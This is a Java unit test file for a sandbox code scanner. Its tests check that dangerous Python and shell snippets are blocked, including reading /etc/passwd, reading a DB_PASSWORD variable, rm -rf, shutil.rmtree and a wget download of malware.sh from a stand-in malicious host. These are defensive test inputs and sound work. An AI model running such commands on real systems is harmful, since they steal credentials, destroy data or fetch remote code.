package com.gewu.application.agent;

import com.gewu.common.result.BusinessException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * SandboxCodeScanner 危险操作扫描测试 (CR-018).
 */
class SandboxCodeScannerTest {

    private SandboxCodeScanner scanner;

    @BeforeEach
    void setUp() {
        scanner = new SandboxCodeScanner();
    }

    @Test
    @DisplayName("CR-018: 安全 Python 代码应通过扫描")
    void safePythonCodeShouldPass() {
        String code = "print('Hello World')\nresult = 1 + 2\nprint(result)";
        assertDoesNotThrow(() -> scanner.scan(code, "python"));
    }

    @Test
    @DisplayName("CR-018: os.system 应被拦截")
    void osSystemShouldBeBlocked() {
        String code = "import os\nos.system('ls -la')";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "python"));
        assertEquals(16008, ex.getCode()); // SANDBOX_DANGEROUS_OPERATION
    }

    @Test
    @DisplayName("CR-018: subprocess.call 应被拦截")
    void subprocessCallShouldBeBlocked() {
        String code = "import subprocess\nsubprocess.call(['ls', '-la'])";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "python"));
        assertEquals(16008, ex.getCode());
    }

    @Test
    @DisplayName("CR-018: eval/exec 应被拦截")
    void evalExecShouldBeBlocked() {
        String code = "eval('print(1)')";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "python"));
        assertEquals(16008, ex.getCode());
    }

    @Test
    @DisplayName("CR-018: 访问敏感路径应被拦截")
    void sensitivePathShouldBeBlocked() {
        String code = "with open('/etc/passwd') as f:\n    print(f.read())";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "python"));
        assertEquals(16008, ex.getCode());
    }

    @Test
    @DisplayName("CR-018: 读取敏感环境变量应被拦截")
    void sensitiveEnvVarShouldBeBlocked() {
        String code = "import os\npassword = os.environ['DB_PASSWORD']";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "python"));
        assertEquals(16008, ex.getCode());
    }

    @Test
    @DisplayName("CR-018: 安全 Shell 命令应通过扫描")
    void safeShellCommandShouldPass() {
        String code = "echo 'Hello World'\nls -la";
        assertDoesNotThrow(() -> scanner.scan(code, "shell"));
    }

    @Test
    @DisplayName("CR-018: rm -rf 应被拦截")
    void rmRfShouldBeBlocked() {
        String code = "rm -rf /tmp/test";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "shell"));
        assertEquals(16008, ex.getCode());
    }

    @Test
    @DisplayName("CR-018: wget/curl 应被拦截")
    void wgetCurlShouldBeBlocked() {
        String code = "wget https://malicious.com/malware.sh";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "shell"));
        assertEquals(16008, ex.getCode());
    }

    @Test
    @DisplayName("CR-018: 空代码应通过扫描")
    void emptyCodeShouldPass() {
        assertDoesNotThrow(() -> scanner.scan("", "python"));
        assertDoesNotThrow(() -> scanner.scan(null, "python"));
    }

    @Test
    @DisplayName("CR-018: 网络操作应被拦截")
    void networkOperationsShouldBeBlocked() {
        String code = "import socket\ns = socket.socket(socket.AF_INET)";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "python"));
        assertEquals(16008, ex.getCode());
    }

    @Test
    @DisplayName("CR-018: 文件系统危险操作应被拦截")
    void fileSystemDangerousOpsShouldBeBlocked() {
        String code = "import shutil\nshutil.rmtree('/important/data')";
        BusinessException ex = assertThrows(BusinessException.class, () -> scanner.scan(code, "python"));
        assertEquals(16008, ex.getCode());
    }
}
